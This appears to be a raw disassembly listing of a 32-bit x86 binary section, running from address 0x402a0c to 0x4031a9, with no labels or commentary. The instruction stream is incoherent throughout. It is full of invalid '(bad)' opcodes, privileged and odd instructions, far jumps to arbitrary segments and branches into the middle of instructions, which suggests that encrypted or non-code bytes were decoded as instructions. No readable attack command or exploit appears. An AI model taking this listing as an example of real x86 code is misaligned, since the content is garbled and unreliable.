  402a0c:	repnz mov cl,0x2a
  402a0f:	jnp    0x402a70
  402a11:	into   
  402a12:	js     0x402a31
  402a14:	and    eax,0x635e7342
  402a19:	inc    eax
  402a1a:	mov    bh,0xc3
  402a1c:	adc    BYTE PTR [eax+0x4a],cl
  402a1f:	in     eax,0x70
  402a21:	(bad)  
  402a23:	int3   
  402a24:	cmp    DWORD PTR [ecx+edi*1],ebx
  402a27:	jbe    0x4029aa
  402a29:	int    0x45
  402a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a2d:	hlt    
  402a2e:	clc    
  402a2f:	push   0xf94bda61
  402a34:	mov    cl,0x89
  402a36:	lods   al,BYTE PTR ds:[esi]
  402a37:	dec    ebx
  402a39:	mov    ds:0x520c324f,al
  402a3e:	pop    edi
  402a3f:	jge    0x402a55
  402a41:	cmc    
  402a42:	inc    esp
  402a43:	mov    ch,0xe8
  402a45:	or     eax,0xe49bf7b8
  402a4a:	push   esi
  402a4b:	mov    cl,BYTE PTR ss:[ecx+ebp*1+0x7c]
  402a50:	fs mov edx,0xf961857e
  402a56:	pop    ds
  402a57:	icebp  
  402a58:	or     al,0xad
  402a5a:	lock inc edx
  402a5c:	xchg   BYTE PTR [edi-0x5a5af1a7],ch
  402a62:	push   es
  402a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a65:	and    BYTE PTR [ecx],ch
  402a67:	jno    0x402ac2
  402a69:	test   al,0xa5
  402a6b:	xor    esp,ebp
  402a6d:	mov    BYTE PTR [ebp+0x7d],bh
  402a70:	pop    ds
  402a71:	cli    
  402a72:	mov    esp,DWORD PTR [edx-0x59]
  402a75:	je     0x402a8b
  402a77:	add    esi,DWORD PTR [ebx]
  402a79:	clc    
  402a7a:	dec    ebx
  402a7b:	sar    BYTE PTR [ecx-0xf],1
  402a7e:	jge    0x402aeb
  402a80:	icebp  
  402a81:	repz xor cl,BYTE PTR [esi]
  402a84:	xor    al,BYTE PTR [ebp+edx*2+0x259750e2]
  402a8b:	into   
  402a8c:	pop    eax
  402a8d:	(bad)  
  402a8e:	mov    dh,0x2c
  402a90:	call   DWORD PTR [edi-0x35bdf20b]
  402a96:	jnp    0x402a3b
  402a98:	cmp    BYTE PTR [ecx],0x78
  402a9b:	or     eax,0x5b9883ee
  402aa0:	mov    cl,0x43
  402aa2:	xor    ebp,DWORD PTR [ecx-0x22]
  402aa5:	popf   
  402aa6:	int3   
  402aa7:	imul   ebp,ecx,0x9d890bf8
  402aad:	lods   eax,DWORD PTR ds:[esi]
  402aae:	bound  ebp,QWORD PTR [ebp+0x54]
  402ab1:	push   ecx
  402ab2:	add    edx,DWORD PTR [esi+0x5e6baa2b]
  402ab8:	test   al,0x31
  402aba:	push   cs
  402abb:	cmp    al,0xe0
  402abd:	adc    al,0x28
  402abf:	xchg   esp,eax
  402ac0:	stc    
  402ac1:	inc    esi
  402ac2:	sbb    ch,BYTE PTR [bx+di+0x2b93]
  402ac7:	push   ecx
  402ac8:	loop   0x402ae4
  402aca:	dec    ebx
  402acb:	mov    DWORD PTR [edx+eiz*2],ebp
  402ace:	or     BYTE PTR ds:0x65a3db62,bh
  402ad4:	xchg   edx,eax
  402ad5:	mov    dh,0x35
  402ad7:	mov    ah,0x2b
  402ad9:	cmp    BYTE PTR [ebx-0x52],bh
  402adc:	test   al,0x72
  402ade:	inc    ecx
  402adf:	scas   al,BYTE PTR es:[edi]
  402ae0:	sbb    dh,BYTE PTR [esp]
  402ae3:	aad    0xc9
  402ae5:	jne    0x402a87
  402ae7:	xor    ebp,DWORD PTR [esp+ebp*2]
  402aea:	(bad)  
  402aeb:	fwait
  402aec:	scas   eax,DWORD PTR es:[edi]
  402aed:	or     esp,0x34
  402af0:	xchg   DWORD PTR [esi],esi
  402af2:	scas   al,BYTE PTR es:[edi]
  402af3:	outs   dx,BYTE PTR ds:[esi]
  402af4:	add    eax,0x8546679a
  402af9:	ds sub ch,ch
  402afc:	mov    dl,BYTE PTR [ebx+0x1ec7a00b]
  402b02:	and    ecx,DWORD PTR [ecx-0x2]
  402b05:	jge    0x402aba
  402b07:	mov    BYTE PTR [ecx-0x729bd41a],al
  402b0d:	pop    ds
  402b0e:	mov    edi,0x2cbb4c85
  402b13:	aad    0x25
  402b15:	pop    eax
  402b16:	loope  0x402b64
  402b18:	enter  0x5a83,0x5d
  402b1c:	dec    edx
  402b1d:	adc    BYTE PTR [edx+0x67],0x1e
  402b21:	cs popa 
  402b23:	aas    
  402b24:	arpl   WORD PTR [ecx+0x37],sp
  402b27:	dec    edi
  402b28:	rcr    DWORD PTR fs:[eax+0x68feb206],0x68
  402b30:	outs   dx,DWORD PTR ds:[esi]
  402b31:	out    dx,eax
  402b32:	(bad)  
  402b34:	ds add eax,0xd51aadf8
  402b3a:	fcom   QWORD PTR [esi]
  402b3c:	imul   ebx,DWORD PTR [ebx+edi*1-0x4d379079],0x15d499a3
  402b47:	pop    ss
  402b48:	fisttp QWORD PTR [edi-0x6d5910e2]
  402b4e:	repz adc bh,BYTE PTR [ebp+0x71]
  402b52:	and    ebx,edx
  402b54:	lods   al,BYTE PTR ds:[esi]
  402b55:	aad    0xd4
  402b57:	and    al,0xf1
  402b59:	arpl   WORD PTR [esp+esi*4-0x4d362e],bx
  402b60:	out    0x6,eax
  402b62:	dec    eax
  402b63:	cmc    
  402b64:	pop    ebp
  402b65:	push   es
  402b66:	add    eax,0x26446677
  402b6b:	dec    esp
  402b6c:	test   BYTE PTR [edi-0x58],0xda
  402b70:	lods   al,BYTE PTR ds:[esi]
  402b71:	or     eax,0x34ea82ca
  402b76:	push   ebx
  402b77:	scas   al,BYTE PTR es:[edi]
  402b78:	sbb    bl,BYTE PTR [esi-0x3]
  402b7b:	xor    edi,DWORD PTR ds:0x5ea89f6b
  402b81:	adc    eax,0xf9957875
  402b86:	outs   dx,DWORD PTR ds:[esi]
  402b87:	xor    esi,DWORD PTR [ecx-0x6d]
  402b8a:	push   ecx
  402b8b:	and    al,0x26
  402b8d:	jne    0x402b99
  402b8f:	arpl   WORD PTR [eax],ax
  402b91:	adc    DWORD PTR [ebx+0x15],ecx
  402b94:	cmp    esi,ebp
  402b96:	and    al,0x6b
  402b98:	cmp    edx,DWORD PTR [edx-0x3f34bb79]
  402b9e:	jle    0x402b29
  402ba0:	mov    ds:0xf927c316,eax
  402ba5:	and    al,0xcb
  402ba7:	enter  0x6511,0x49
  402bab:	nop
  402bac:	jl     0x402c0c
  402bae:	or     eax,0xdee8746
  402bb3:	xchg   ecx,eax
  402bb4:	sti    
  402bb5:	mov    dh,0xae
  402bb7:	bndldx (bad),ds:[eax-0xf7b2c1f]
  402bbf:	jge    0x402b5f
  402bc1:	mov    dh,0xa3
  402bc3:	fisubr DWORD PTR [ebx-0x901c970]
  402bc9:	xchg   ecx,eax
  402bca:	or     DWORD PTR [edi],0x625db627
  402bd0:	je     0x402b86
  402bd2:	and    eax,0x64751e63
  402bd7:	js     0x402c1d
  402bd9:	xor    al,al
  402bdb:	ja     0x402c22
  402bdd:	icebp  
  402bde:	out    0xea,eax
  402be0:	cs jae 0x402b76
  402be3:	jns    0x402c32
  402be5:	fimul  DWORD PTR [ecx]
  402be7:	mov    eax,ds:0x154b714f
  402bec:	scas   eax,DWORD PTR es:[edi]
  402bed:	les    ebp,FWORD PTR [esi+0xc]
  402bf0:	mov    cl,0x0
  402bf2:	out    dx,eax
  402bf3:	inc    edi
  402bf4:	jg     0x402bff
  402bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bf7:	into   
  402bf8:	xchg   BYTE PTR [edi+0x3d],dl
  402bfb:	inc    edi
  402bfc:	cwde   
  402bfd:	inc    esi
  402bfe:	add    DWORD PTR ds:0x8d61dd18,eax
  402c04:	cmp    eax,0xa35f874d
  402c09:	push   cs
  402c0a:	ins    DWORD PTR es:[edi],dx
  402c0b:	dec    esi
  402c0c:	enter  0x4cad,0x41
  402c10:	scas   al,BYTE PTR es:[edi]
  402c11:	mov    ch,0x15
  402c13:	fistp  WORD PTR [ebp-0x4e5d7588]
  402c19:	mov    edi,0xbc07a586
  402c1e:	jb     0x402c7f
  402c20:	jae    0x402bba
  402c22:	dec    eax
  402c23:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  402c25:	pop    edi
  402c26:	or     ebp,DWORD PTR [ecx-0x7502ea6d]
  402c2c:	sbb    ecx,ebx
  402c2e:	popf   
  402c2f:	pop    ds
  402c30:	add    al,0xb5
  402c32:	xlat   BYTE PTR ds:[ebx]
  402c33:	mov    dh,0xc9
  402c35:	ds pushf 
  402c37:	push   esi
  402c38:	repz out dx,al
  402c3a:	leave  
  402c3b:	sub    edx,DWORD PTR [ecx+0x48262a86]
  402c41:	dec    ebx
  402c42:	fdivr  DWORD PTR [ebp-0x58]
  402c45:	popf   
  402c46:	lahf   
  402c47:	inc    edx
  402c48:	int3   
  402c49:	inc    edx
  402c4a:	xchg   edi,edi
  402c4c:	iret   
  402c4d:	clc    
  402c4e:	stos   DWORD PTR es:[edi],eax
  402c4f:	stc    
  402c50:	cmp    edi,DWORD PTR [edi+ebp*4-0x6c188408]
  402c57:	cmp    al,0x8b
  402c59:	and    BYTE PTR [esi+0x62cffbe0],0x13
  402c60:	push   ds
  402c61:	out    0xba,eax
  402c63:	jmp    0x402cdb
  402c65:	inc    ebx
  402c66:	cmp    edi,0xd09c8eb3
  402c6c:	sbb    edx,DWORD PTR ds:0x81726e7e
  402c72:	sub    DWORD PTR [bp+si-0x72],0x7c
  402c77:	add    BYTE PTR [ebp+0x34e7444f],ch
  402c7d:	in     al,dx
  402c7e:	pop    ebx
  402c7f:	or     DWORD PTR [edi-0x3c1cdaa6],ebx
  402c85:	push   ds
  402c86:	pop    edx
  402c87:	jg     0x402c7b
  402c89:	in     eax,dx
  402c8a:	push   es
  402c8b:	into   
  402c8c:	mul    DWORD PTR [esi-0x33]
  402c8f:	(bad)  
  402c90:	fsubr  st(3),st
  402c92:	shl    DWORD PTR [eax-0x48],0x2f
  402c96:	dec    ecx
  402c97:	jmp    0xd5f06d60
  402c9c:	dec    edi
  402c9d:	dec    edx
  402c9e:	xlat   BYTE PTR ds:[ebx]
  402c9f:	(bad)  
  402ca0:	(bad)  [edi+0x76]
  402ca3:	or     BYTE PTR ds:0x5f13fda8,dh
  402ca9:	xor    dl,dl
  402cab:	jb     0x402d12
  402cad:	scas   al,BYTE PTR es:[edi]
  402cae:	jg     0x402d2f
  402cb0:	jmp    0xec982e94
  402cb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cb6:	in     al,0x15
  402cb8:	sbb    bl,BYTE PTR [ecx-0x1f]
  402cbb:	push   es
  402cbc:	jbe    0x402cf0
  402cbe:	mov    al,ds:0xf7018540
  402cc3:	mov    esi,0xa9619561
  402cc8:	and    BYTE PTR [ecx-0x47],al
  402ccb:	mov    bh,bh
  402ccd:	inc    edi
  402cce:	shr    DWORD PTR [ecx-0x54668308],0x5d
  402cd5:	outs   dx,DWORD PTR ds:[esi]
  402cd6:	dec    esi
  402cd7:	sbb    esp,DWORD PTR [ebp-0x7b]
  402cda:	sub    dh,BYTE PTR [ebp+0x6a]
  402cdd:	add    eax,DWORD PTR [ebx]
  402cdf:	div    BYTE PTR [edi]
  402ce1:	xor    al,0xbc
  402ce3:	jae    0x402d5e
  402ce5:	outs   dx,BYTE PTR ds:[esi]
  402ce6:	mov    esi,0x120f85ef
  402ceb:	and    al,0x5c
  402ced:	cwde   
  402cee:	sbb    DWORD PTR [ecx+esi*4-0x1ba000d3],ecx
  402cf5:	push   0xa240a97e
  402cfa:	std    
  402cfb:	xchg   edx,eax
  402cfc:	inc    edi
  402cfd:	add    eax,0x2fc3ab8b
  402d02:	push   ebp
  402d03:	lods   al,BYTE PTR fs:[esi]
  402d05:	mov    ecx,DWORD PTR [eax-0x7e]
  402d08:	fstp   DWORD PTR [edi+0x5f28d148]
  402d0e:	outs   dx,DWORD PTR ds:[esi]
  402d0f:	cmp    esi,DWORD PTR [esi-0x52]
  402d12:	push   ecx
  402d13:	inc    ecx
  402d14:	(bad)  
  402d16:	fdiv   DWORD PTR [edx+eiz*1+0x33]
  402d1a:	xchg   ecx,eax
  402d1b:	dec    esp
  402d1c:	cmp    al,0x8c
  402d1e:	les    edi,FWORD PTR [edx+0x36]
  402d21:	(bad)  
  402d22:	ss loopne 0x402cc5
  402d25:	dec    ebx
  402d26:	and    esp,DWORD PTR [eax-0x7c1fc6a7]
  402d2c:	inc    ebp
  402d2d:	jl     0x402d24
  402d2f:	das    
  402d30:	mov    eax,0xea377c9f
  402d35:	xchg   DWORD PTR [ebx+0x35],ecx
  402d38:	pcmpeqw mm6,QWORD PTR [edx]
  402d3b:	sbb    ch,al
  402d3d:	retf   0x3240
  402d40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d41:	(bad)  
  402d43:	mov    eax,ds:0x1cf7ae8c
  402d48:	out    0x57,eax
  402d4a:	xor    dl,BYTE PTR [ebx+0xc]
  402d4d:	cli    
  402d4e:	dec    edx
  402d4f:	mov    edi,0x85f295ee
  402d54:	pop    esp
  402d55:	jmp    0x402cf6
  402d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d58:	mov    ds,WORD PTR ds:0xfc5d0396
  402d5e:	jp     0x402ce1
  402d60:	and    eax,0x9698f330
  402d65:	mov    esi,0x46b4246a
  402d6a:	mov    ecx,0xfc64fbae
  402d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d70:	mov    eax,ds:0xb6d809c
  402d75:	into   
  402d76:	inc    esp
  402d77:	cmp    BYTE PTR [esp+edx*8-0x490eb926],0x5d
  402d7f:	into   
  402d80:	int3   
  402d81:	pusha  
  402d82:	xor    DWORD PTR [edi-0x4e],ebp
  402d85:	rcr    bl,1
  402d87:	test   BYTE PTR [edx+0x7d],al
  402d8a:	add    DWORD PTR [ebp-0x5b],ebp
  402d8d:	aaa    
  402d8e:	sub    BYTE PTR [edx+eiz*2-0x3fea6c8c],ch
  402d95:	jmp    0xd677:0x509dcd2d
  402d9c:	jb     0x402d5e
  402d9e:	lods   al,BYTE PTR ds:[esi]
  402d9f:	adc    DWORD PTR [esi],ecx
  402da1:	push   cs
  402da2:	mov    ?,WORD PTR gs:[esi]
  402da5:	inc    ecx
  402da6:	fs fs ret 0x9410
  402dab:	mov    dl,0x1b
  402dad:	mov    bh,0x5c
  402daf:	jae    0x402d9c
  402db1:	loopne 0x402de5
  402db3:	pop    ebx
  402db4:	aam    0x9e
  402db6:	test   bl,dl
  402db8:	pop    esp
  402db9:	push   es
  402dba:	jns    0x402dfe
  402dbc:	and    BYTE PTR [ecx+0x39],bh
  402dbf:	xchg   edi,eax
  402dc0:	jle    0x402d4b
  402dc2:	or     eax,0x6d3a29cc
  402dc7:	mov    eax,ds:0x5cc41cc5
  402dcc:	push   ebx
  402dcd:	stos   BYTE PTR es:[edi],al
  402dce:	aad    0x11
  402dd0:	adc    edx,edi
  402dd2:	sbb    al,0xac
  402dd4:	push   ecx
  402dd5:	inc    ebp
  402dd6:	pop    edi
  402dd7:	sub    al,0xce
  402dd9:	xchg   esi,eax
  402dda:	add    eax,0x7e585197
  402ddf:	icebp  
  402de0:	ss repz dec sp
  402de4:	mov    al,0x59
  402de6:	sbb    ecx,DWORD PTR [ebx-0x62a2d9a0]
  402dec:	mov    ds:0xe00f3407,al
  402df1:	test   al,0x10
  402df3:	daa    
  402df4:	test   ebx,eax
  402df6:	mov    edi,DWORD PTR [esi]
  402df8:	and    eax,0xeda731cb
  402dfd:	mov    eax,0x9910431f
  402e02:	mov    bh,0xe6
  402e04:	push   ebx
  402e05:	fist   WORD PTR [esi+0x5a]
  402e08:	ss into 
  402e0a:	cdq    
  402e0b:	jb     0x402e1a
  402e0d:	stos   DWORD PTR es:[edi],eax
  402e0e:	dec    esp
  402e0f:	mov    ch,0xc7
  402e11:	les    ebp,FWORD PTR [ebp-0x6a]
  402e14:	(bad)  
  402e15:	fxrstor [edi]
  402e18:	adc    al,0x6
  402e1a:	jp     0x402dd4
  402e1c:	pusha  
  402e1d:	xchg   esp,eax
  402e1e:	push   esi
  402e1f:	sti    
  402e20:	ja     0x402e6b
  402e22:	call   0x6a4a6702
  402e27:	inc    edi
  402e28:	cmp    dh,BYTE PTR [esi+esi*2-0x601c39ce]
  402e2f:	popa   
  402e30:	cmp    BYTE PTR [esi-0x6eb33ffd],0x66
  402e37:	lahf   
  402e38:	xchg   esi,eax
  402e39:	jge    0x402eab
  402e3b:	mov    ecx,DWORD PTR [edi+eiz*2]
  402e3e:	adc    ecx,esi
  402e40:	dec    ebx
  402e41:	lods   al,BYTE PTR ds:[esi]
  402e42:	push   ebx
  402e43:	pop    DWORD PTR [ebp-0x1046b6b]
  402e49:	adc    DWORD PTR [ecx],ebp
  402e4b:	xchg   ebx,ebx
  402e4d:	cmp    BYTE PTR [edx-0x11],0xfb
  402e51:	mov    al,cl
  402e53:	test   eax,0x89ea087f
  402e58:	ret    
  402e59:	cmp    ecx,DWORD PTR [ecx-0x5e]
  402e5c:	fist   DWORD PTR [esi-0x498844fb]
  402e62:	ja     0x402eb7
  402e64:	ss icebp 
  402e66:	fild   WORD PTR [ebx+edi*1+0x162951ca]
  402e6d:	popa   
  402e6e:	mov    al,0x4f
  402e70:	mov    dh,0x2f
  402e72:	wbinvd 
  402e74:	push   ecx
  402e75:	jge    0x402eee
  402e77:	add    bh,BYTE PTR [ebp+0x1]
  402e7a:	outs   dx,DWORD PTR ds:[esi]
  402e7b:	loopne 0x402e77
  402e7d:	or     bl,dl
  402e7f:	imul   edi,DWORD PTR [esp+edx*8-0x17],0x83c711d5
  402e87:	jl     0x402ee8
  402e89:	mov    bl,0xd2
  402e8b:	cdq    
  402e8c:	inc    ebp
  402e8d:	mov    cl,0xf7
  402e8f:	or     bh,bl
  402e91:	jmp    0x402e87
  402e93:	xchg   esp,eax
  402e94:	retf   
  402e95:	scas   eax,DWORD PTR es:[edi]
  402e96:	xchg   ebp,eax
  402e97:	add    DWORD PTR [ebx],esi
  402e99:	dec    edx
  402e9a:	das    
  402e9b:	add    BYTE PTR [esi+0x4b],al
  402e9e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  402ea0:	das    
  402ea1:	jge    0x402f05
  402ea3:	mov    bl,0x72
  402ea5:	mov    DWORD PTR [edx+0x47],ebx
  402ea8:	xor    edx,eax
  402eaa:	std    
  402eab:	gs in  eax,dx
  402ead:	stc    
  402eae:	and    ch,dh
  402eb0:	or     cl,al
  402eb2:	ins    BYTE PTR es:[edi],dx
  402eb3:	cmp    BYTE PTR [edx],dl
  402eb5:	jae    0x402e58
  402eb7:	cmp    al,0xe0
  402eb9:	cmp    edx,DWORD PTR [edx+0x54]
  402ebc:	subps  xmm6,XMMWORD PTR [ecx+edi*4+0x7c]
  402ec1:	test   al,0x25
  402ec3:	stos   BYTE PTR es:[edi],al
  402ec4:	mov    ah,0xf8
  402ec6:	daa    
  402ec7:	jmp    0x659aa7f5
  402ecc:	cdq    
  402ecd:	xchg   BYTE PTR [edi+ebp*2-0x6c],cl
  402ed1:	push   ebx
  402ed2:	addr16 inc ebp
  402ed4:	pop    esp
  402ed5:	push   cs
  402ed6:	push   eax
  402ed7:	bound  esp,QWORD PTR [ecx+eiz*1+0x4e]
  402edb:	loop   0x402f34
  402edd:	mov    ch,bh
  402edf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ee0:	popf   
  402ee1:	cs mov ebx,0x34ea3e70
  402ee7:	xchg   cl,ch
  402ee9:	ins    BYTE PTR es:[edi],dx
  402eea:	loop   0x402f0a
  402eec:	jb     0x402ef7
  402eee:	gs in  al,0xc3
  402ef1:	or     BYTE PTR gs:[ecx-0x42fa53bf],0x7e
  402ef9:	cli    
  402efa:	mov    eax,ds:0xf08ab315
  402eff:	fild   DWORD PTR [ecx-0x6b]
  402f02:	fwait
  402f03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f04:	and    ch,bh
  402f06:	mov    edi,0x79b8f6b
  402f0b:	push   ds
  402f0c:	mov    al,ds:0x5027db25
  402f11:	add    ch,bl
  402f13:	sub    dl,BYTE PTR [ecx+0x4]
  402f16:	mov    esp,ss
  402f18:	push   edi
  402f19:	jns    0x402f64
  402f1b:	pop    ebx
  402f1c:	call   0x5f1d:0xd3cbdcb8
  402f23:	je     0x402ef3
  402f25:	add    ecx,DWORD PTR [ebp-0x5ef0adb9]
  402f2b:	clc    
  402f2c:	xchg   ebp,eax
  402f2d:	scas   al,BYTE PTR es:[edi]
  402f2e:	adc    eax,0xe85e8181
  402f33:	sub    ecx,edi
  402f35:	lods   eax,DWORD PTR ds:[esi]
  402f36:	push   ebp
  402f37:	popa   
  402f38:	mov    ebx,0x164ef131
  402f3d:	clc    
  402f3e:	mov    WORD PTR [ecx-0x98bfeaf],fs
  402f44:	jl     0x402f10
  402f46:	sbb    eax,ebp
  402f48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f49:	fcom   QWORD PTR [ebp+0xa5b2fd4]
  402f4f:	(bad)  [esi+0x58c83486]
  402f55:	cwde   
  402f56:	ret    
  402f57:	fnsave [edi-0x6ec47c22]
  402f5d:	and    ecx,DWORD PTR [edx]
  402f5f:	sbb    eax,0xdedfd286
  402f64:	lods   al,BYTE PTR ds:[esi]
  402f65:	inc    ecx
  402f66:	mov    ecx,0x1b36f948
  402f6b:	cs pop esi
  402f6d:	pushf  
  402f6e:	xor    al,0x37
  402f70:	adc    al,0x43
  402f72:	fnstcw WORD PTR [ebp+0x5c2d389d]
  402f78:	mov    eax,0xc095e590
  402f7d:	and    DWORD PTR [eax+0x74],ebp
  402f80:	xchg   ebp,eax
  402f81:	lahf   
  402f82:	sar    BYTE PTR [edi-0xfaca3e4],0x62
  402f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f8a:	mov    edx,0xf638f0e4
  402f8f:	imul   ebx,DWORD PTR [ebp-0x5c],0x1
  402f93:	outs   dx,BYTE PTR ds:[esi]
  402f94:	adc    al,bh
  402f96:	pop    edi
  402f97:	fucomip st,st(1)
  402f99:	and    esi,DWORD PTR [edi-0xe]
  402f9c:	inc    si
  402f9e:	or     DWORD PTR [esp+eiz*4-0x6bc15bc2],0x79
  402fa6:	adc    ebp,ecx
  402fa8:	aad    0xbc
  402faa:	sub    al,0xaf
  402fac:	cmp    esp,esi
  402fae:	and    ax,0x95c2
  402fb2:	ins    DWORD PTR es:[edi],dx
  402fb3:	popf   
  402fb4:	pusha  
  402fb5:	jl     0x402fe9
  402fb7:	lods   eax,DWORD PTR ds:[esi]
  402fb8:	bound  eax,QWORD PTR [edx+0x3548b444]
  402fbe:	cmc    
  402fbf:	cmp    ch,BYTE PTR [edi+0x5a076455]
  402fc5:	and    eax,0xa71088e5
  402fca:	les    edx,FWORD PTR [ebx+0x5932262]
  402fd0:	and    al,0x7
  402fd2:	mov    al,BYTE PTR [esi-0x485463e6]
  402fd8:	or     edi,DWORD PTR [eax]
  402fda:	inc    ebx
  402fdb:	or     ecx,esi
  402fdd:	bound  esp,QWORD PTR [ebx-0x1c580b3d]
  402fe3:	aaa    
  402fe4:	mov    eax,ds:0xe172465a
  402fe9:	in     al,dx
  402fea:	cmp    dh,cl
  402fec:	cmove  ecx,DWORD PTR [eax+0xf]
  402ff0:	icebp  
  402ff1:	call   0xc67d:0x81e5adb1
  402ff8:	aad    0xc9
  402ffa:	dec    eax
  402ffb:	fsub   QWORD PTR [edx-0x41]
  402ffe:	loop   0x402ff6
  403000:	sub    eax,DWORD PTR [ebp+0x2645be9e]
  403006:	mov    ebp,edi
  403008:	jae    0x40304c
  40300a:	xor    DWORD PTR [esi-0x1e],0x21
  40300e:	aam    0x8e
  403010:	jmp    0x51c1:0x72009bad
  403017:	cmp    bh,BYTE PTR [eax]
  403019:	mov    cs,WORD PTR [ecx]
  40301b:	sti    
  40301c:	xchg   edi,ecx
  40301e:	int    0x43
  403020:	ds cmp eax,0x16ad4026
  403026:	in     al,dx
  403027:	iret   
  403028:	cmp    edi,esp
  40302a:	adc    ebp,DWORD PTR [esi+0x6a]
  40302d:	jnp    0x40300a
  40302f:	adc    ecx,edi
  403031:	stos   DWORD PTR es:[edi],eax
  403032:	mov    eax,0xa6ea10dc
  403037:	mov    edi,0x85418691
  40303c:	mov    ch,BYTE PTR [edx-0x43]
  40303f:	sbb    BYTE PTR [eax+0x21],bh
  403042:	retf   0x79c5
  403045:	mov    eax,0xcb8f791b
  40304a:	inc    eax
  40304b:	xor    ch,BYTE PTR ds:0xae02263a
  403051:	or     DWORD PTR [ecx+0x5a],esi
  403054:	adc    BYTE PTR [ebp+0x4c],ah
  403057:	inc    esp
  403058:	cmp    al,0xb5
  40305a:	fistp  QWORD PTR [edx+0x3e]
  40305d:	xor    bl,BYTE PTR [ebx-0x44]
  403060:	ss mov ecx,0x2e26c174
  403066:	jne    0x40308c
  403068:	icebp  
  403069:	pop    ss
  40306a:	or     DWORD PTR [ebx+0x20279089],ecx
  403070:	and    edx,eax
  403072:	inc    eax
  403073:	in     eax,dx
  403074:	rol    BYTE PTR [esp+eax*1],cl
  403077:	test   eax,0x5eea7e05
  40307c:	push   ss
  40307d:	sub    DWORD PTR [edi],0x86f58bd8
  403083:	iret   
  403084:	inc    esp
  403085:	(bad)  
  403086:	dec    ebp
  403087:	imul   edx,DWORD PTR [edi-0x22],0x5a203e67
  40308e:	dec    esp
  40308f:	cmc    
  403090:	xchg   esp,eax
  403091:	cld    
  403092:	nop
  403093:	test   DWORD PTR gs:[edi*8+0x7b04dc51],0x49a104f2
  40309f:	mov    bl,0x6d
  4030a1:	test   BYTE PTR [ecx+0x50],ah
  4030a4:	dec    eax
  4030a5:	inc    edi
  4030a6:	test   DWORD PTR [ebx+0x7d750b8b],0x60913fff
  4030b0:	push   es
  4030b1:	or     DWORD PTR [esi+eiz*2],0x506d0da8
  4030b8:	dec    ebp
  4030b9:	pushf  
  4030ba:	or     eax,DWORD PTR [ecx]
  4030bc:	leave  
  4030bd:	call   0x22709cc5
  4030c2:	mov    ds:0xa6abf8d,al
  4030c7:	cmp    DWORD PTR [ebx+0x7d804058],esp
  4030cd:	mov    cl,0x83
  4030cf:	fisubr WORD PTR [ebx+0x3d]
  4030d2:	enter  0xd412,0xc8
  4030d6:	dec    ebp
  4030d7:	aam    0x6c
  4030d9:	imul   ecx,eax,0xffffffea
  4030dc:	pop    eax
  4030de:	pop    ebp
  4030df:	aas    
  4030e0:	fs pop edi
  4030e2:	xchg   BYTE PTR [ebp-0x1d88abe8],cl
  4030e8:	mov    ah,BYTE PTR [ebx+0x60]
  4030eb:	sub    dl,BYTE PTR [eax-0x7f]
  4030ee:	aad    0xf6
  4030f0:	and    eax,0xb9d377c7
  4030f5:	sub    DWORD PTR [esi-0x201f5699],ebx
  4030fb:	pop    esp
  4030fc:	clts   
  4030fe:	jnp    0x403100
  403100:	or     cl,dl
  403102:	int3   
  403103:	sbb    al,0x69
  403105:	pop    ebp
  403106:	jge    0x403129
  403108:	sbb    al,0xe0
  40310a:	xchg   ebx,eax
  40310b:	jb     0x403133
  40310d:	loop   0x403125
  40310f:	push   ebx
  403110:	cmc    
  403111:	xchg   ebp,eax
  403112:	(bad)  
  403113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403114:	add    ah,BYTE PTR [eax-0x1ba6889e]
  40311a:	shr    ecx,cl
  40311c:	mov    dl,0x71
  40311e:	sub    eax,0x755668d
  403123:	or     BYTE PTR [edi],0xc4
  403126:	shl    ebp,0xdb
  403129:	lahf   
  40312a:	test   DWORD PTR [eax-0x3c],0x6baa7956
  403131:	dec    ecx
  403132:	xor    al,0xb
  403134:	sbb    esi,edx
  403136:	xor    eax,0x2837a207
  40313b:	das    
  40313c:	rcr    DWORD PTR [ebp-0x780a6ba7],cl
  403142:	retf   
  403143:	add    al,0x71
  403145:	lds    esi,FWORD PTR [edx-0x4a257cc]
  40314b:	push   0xffffffd3
  40314d:	cmp    BYTE PTR [eax+0x62],dh
  403150:	aad    0x2c
  403152:	cli    
  403153:	xchg   edi,eax
  403154:	inc    ebx
  403155:	retf   0x9d18
  403158:	inc    DWORD PTR [eax-0x55]
  40315b:	test   DWORD PTR [edi-0x69429492],ecx
  403161:	mov    edi,0x8c9de0a9
  403166:	cmc    
  403167:	xchg   ecx,eax
  403168:	das    
  403169:	push   edx
  40316a:	xchg   BYTE PTR [ebp+0x7e],cl
  40316d:	in     eax,dx
  40316e:	lods   eax,DWORD PTR ds:[esi]
  40316f:	in     eax,0xff
  403171:	ret    
  403172:	std    
  403173:	popf   
  403174:	sbb    DWORD PTR [eax],esp
  403176:	add    eax,0x2f62759b
  40317b:	cmp    DWORD PTR [esi-0x1f],ebp
  40317e:	xchg   ebp,eax
  40317f:	inc    esi
  403180:	push   ebx
  403181:	jo     0x40316e
  403183:	xchg   esi,eax
  403184:	jmp    0x64681766
  403189:	push   esi
  40318a:	mov    ebx,0x7e354aba
  40318f:	int3   
  403190:	aaa    
  403191:	cdq    
  403192:	dec    edi
  403193:	xchg   ebx,eax
  403194:	jno    0x4031d3
  403196:	bound  edi,QWORD PTR [ebx-0x29cefc4f]
  40319c:	imul   edx,edx,0xffffff81
  40319f:	retf   0x4680
  4031a2:	lods   eax,DWORD PTR ds:[esi]
  4031a3:	mov    eax,0x563630a4
  4031a8:	ins    BYTE PTR es:[edi],dx
  4031a9:	xchg   ebx,eax
